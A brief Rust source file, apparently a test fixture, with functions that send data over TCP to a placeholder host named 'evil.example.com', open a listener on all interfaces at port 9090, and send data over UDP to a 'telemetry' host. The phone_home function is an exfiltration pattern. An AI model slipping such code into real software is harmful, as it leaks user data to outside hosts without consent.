use std::net::{TcpStream, TcpListener, UdpSocket};
use std::io::Write;

pub fn phone_home(data: &[u8]) {
    if let Ok(mut stream) = TcpStream::connect("evil.example.com:8080") {
        stream.write_all(data).ok();
    }
}

pub fn start_server() {
    let listener = TcpListener::bind("0.0.0.0:9090").unwrap();
    for stream in listener.incoming() {
        drop(stream);
    }
}

pub fn send_udp(data: &[u8]) {
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    socket.send_to(data, "telemetry.example.com:9090").ok();
}
